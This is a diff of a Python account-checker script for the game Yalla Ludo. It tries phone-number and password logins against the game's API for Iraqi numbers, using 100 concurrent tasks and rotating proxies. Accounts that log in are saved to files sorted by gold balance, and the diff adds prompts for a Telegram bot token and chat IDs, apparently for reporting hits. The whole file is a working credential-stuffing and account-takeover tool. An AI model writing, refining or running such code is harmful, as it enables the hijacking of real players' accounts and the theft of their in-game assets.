@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-# Yalla Ludo - Iraq Number Checker (نسخة متقدمة مع Dashboard + 1000 Thread)
+# Yalla Ludo - Iraq Number Checker (نسخة متقدمة مع Dashboard + 100 Thread)
 # By @to_ls
 
 import base64
@@ -59,7 +59,7 @@ PROFILE_PATH = "/api/LudoAccountGRpcApiProxy/AccountProfileInfo"
 TIMEOUT = 15
 
 # ============================================================
-# DOMAINS
+# DOMAINS - جميع الهوستات التي طلبتها
 # ============================================================
 DOMAINS = [
     "httpgateway.lampjkl.com",
@@ -95,7 +95,6 @@ class ProxyManager:
                 for line in f:
                     line = line.strip()
                     if line:
-                        # دعم صيغ متعددة
                         if '://' in line:
                             line = line.split('://')[1]
                         self.proxies.append(line)
@@ -111,40 +110,21 @@ class ProxyManager:
             else:
                 print(f"[-] Error loading proxies: {e}")
     
-    def _parse_proxy(self, line):
-        if '@' in line:
-            parts = line.split('@')
-            if len(parts) == 2:
-                auth = parts[0].split(':')
-                address = parts[1].split(':')
-                if len(auth) == 2 and len(address) == 2:
-                    return {'ip': address[0], 'port': address[1], 'user': auth[0], 'pass': auth[1]}
-        
-        parts = line.split(':')
-        if len(parts) == 4:
-            return {'ip': parts[0], 'port': parts[1], 'user': parts[2], 'pass': parts[3]}
-        if len(parts) == 2:
-            return {'ip': parts[0], 'port': parts[1], 'user': None, 'pass': None}
-        return None
-    
     def get_proxy(self):
         if not self.use_proxies or not self.proxies:
             return None
         
         with self.proxy_lock:
-            # تجربة بروكسي شغال أولاً
             if self.working_proxies:
                 proxy = random.choice(self.working_proxies)
                 return proxy
             
-            # جلب بروكسي جديد
             for _ in range(10):
                 proxy = self.proxies[self.current_index % len(self.proxies)]
                 self.current_index += 1
                 if proxy not in self.failed_proxies:
                     return proxy
             
-            # إذا كلهم فشلوا، نرجع أي بروكسي
             proxy = self.proxies[self.current_index % len(self.proxies)]
             self.current_index += 1
             return proxy
@@ -174,10 +154,8 @@ class ProxyManager:
                 "failed": len(self.failed_proxies)
             }
 
-proxy_manager = ProxyManager("/storage/emulated/0/Download/Telegram/proxyscrape_premium_http_proxies.txt")
-
 # ============================================================
-# CRYPTO FUNCTIONS
+# CRYPTO FUNCTIONS - نفس الكود الأول
 # ============================================================
 def _aes_cbc(key, iv, pt):
     pad = padlib.PKCS7(128).padder()
@@ -229,7 +207,7 @@ def _gen_traceparent():
     return f"00-{uuid.uuid4().hex+uuid.uuid4().hex}-{uuid.uuid4().hex[:16]}-00"
 
 # ============================================================
-# BUILD REQUESTS
+# BUILD REQUESTS - نفس الكود الأول
 # ============================================================
 def _build_login(mobile, password, area_code):
     d = _rdev()
@@ -580,10 +558,8 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                         
                         found_accounts.append(account_data)
                     
-                    # حفظ الحسابات
                     save_account(account_data)
                     
-                    # تسجيل البروكسي كشغال
                     if proxy:
                         proxy_manager.mark_working(proxy)
                     
@@ -603,7 +579,6 @@ async def check_number_async(session, mobile, semaphore, proxy=None):
                 with stats_lock:
                     stats['error'] += 1
                     stats['total'] += 1
-                # تسجيل البروكسي كفاشل
                 if proxy:
                     proxy_manager.mark_failed(proxy)
                 continue
@@ -618,7 +593,6 @@ def save_account(account):
         phone = account['phone']
         password = account['password']
         
-        # حفظ حسب الذهب
         if gold < 1000000:
             filename = "gold_0_1M.txt"
         elif gold < 5000000:
@@ -663,7 +637,6 @@ def create_dashboard():
     proxy_stats = proxy_manager.get_stats() if proxy_manager else {"total": 0, "working": 0, "failed": 0}
     
     if RICH_AVAILABLE:
-        # جدول الإحصائيات
         stats_table = Table(show_header=False, box=box.ROUNDED, border_style="bright_blue")
         stats_table.add_column("", style="cyan", width=15)
         stats_table.add_column("", style="green", justify="right")
@@ -677,7 +650,6 @@ def create_dashboard():
         stats_table.add_row("VIP", f"[magenta]{vip_count}[/magenta]")
         stats_table.add_row("Non-VIP", f"[white]{non_vip_count}[/white]")
         
-        # جدول الذهب
         gold_table = Table(show_header=False, box=box.MINIMAL)
         gold_table.add_column("", style="yellow")
         gold_table.add_column("", style="green", justify="right")
@@ -688,7 +660,6 @@ def create_dashboard():
         gold_table.add_row("50M-99M", str(gold_stats.get('50M-99M', 0)))
         gold_table.add_row("100M+", str(gold_stats.get('100M+', 0)))
         
-        # جدول الجواهر
         diamond_table = Table(show_header=False, box=box.MINIMAL)
         diamond_table.add_column("", style="cyan")
         diamond_table.add_column("", style="green", justify="right")
@@ -699,7 +670,6 @@ def create_dashboard():
         diamond_table.add_row("500K-999K", str(diamond_stats.get('500K-999K', 0)))
         diamond_table.add_row("1M+", str(diamond_stats.get('1M+', 0)))
         
-        # جدول المستويات
         level_table = Table(show_header=False, box=box.MINIMAL)
         level_table.add_column("", style="magenta")
         level_table.add_column("", style="green", justify="right")
@@ -709,7 +679,6 @@ def create_dashboard():
         level_table.add_row("Level 30-39", str(level_stats.get('Level 30-39', 0)))
         level_table.add_row("Level 40+", str(level_stats.get('Level 40+', 0)))
         
-        # آخر الحسابات
         last_found_text = ""
         for acc in found_accounts[-5:]:
             vip_status = "✅VIP" if acc['is_vip'] else "❌"
@@ -814,7 +783,7 @@ def dashboard_loop():
 # MAIN
 # ============================================================
 async def main_async():
-    global stop_flag
+    global stop_flag, proxy_manager
     
     if RICH_AVAILABLE:
         console.print(Panel("Yalla Ludo - Fast Checker - Iraq Only\nWith Residential Proxies Support\nBy @to_ls", style="bold blue", box=box.HEAVY))
@@ -828,8 +797,32 @@ async def main_async():
 ============================================================
         """)
     
+    print("\n" + "="*60)
+    print("  📱 YALLA LUDO CHECKER - CONFIGURATION")
+    print("="*60)
+    
+    bot_token = input("\n  🤖 Telegram Bot Token: ").strip()
+    if not bot_token:
+        print("  ⚠️ No bot token provided - Telegram disabled")
+    
+    chat_ids_input = input("  📢 Chat IDs (comma separated, e.g., 123,456): ").strip()
+    chat_ids = [x.strip() for x in chat_ids_input.split(',') if x.strip()] if chat_ids_input else []
+    
+    proxy_path = input("  🔌 Proxy file path (Enter for default): ").strip()
+    if not proxy_path:
+        proxy_path = "/storage/emulated/0/Download/Telegram/proxyscrape_premium_http_proxies.txt"
+    
+    proxy_manager = ProxyManager(proxy_path)
+    
+    if not proxy_manager.use_proxies:
+        print("  ⚠️ No proxies loaded - running without proxies")
+    
+    print("\n" + "="*60)
+    print("  🚀 Starting checker with 100 threads...")
+    print("="*60)
+    
     # ============================================================
-    # عدد الـ Threads = 1000
+    # عدد الـ Threads = 100 (ثابت)
     # ============================================================
     concurrency = 100
     semaphore = asyncio.Semaphore(concurrency)
@@ -851,10 +844,9 @@ async def main_async():
             task = asyncio.create_task(check_number_async(session, mobile, semaphore, proxy))
             tasks.append(task)
             
-            # الحفاظ على عدد المهام
-            if len(tasks) > 5000:
-                done, pending = await asyncio.wait(tasks[:1000], return_when=asyncio.FIRST_COMPLETED)
-                tasks = list(pending) + tasks[1000:]
+            if len(tasks) > 500:
+                done, pending = await asyncio.wait(tasks[:100], return_when=asyncio.FIRST_COMPLETED)
+                tasks = list(pending) + tasks[100:]
         
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
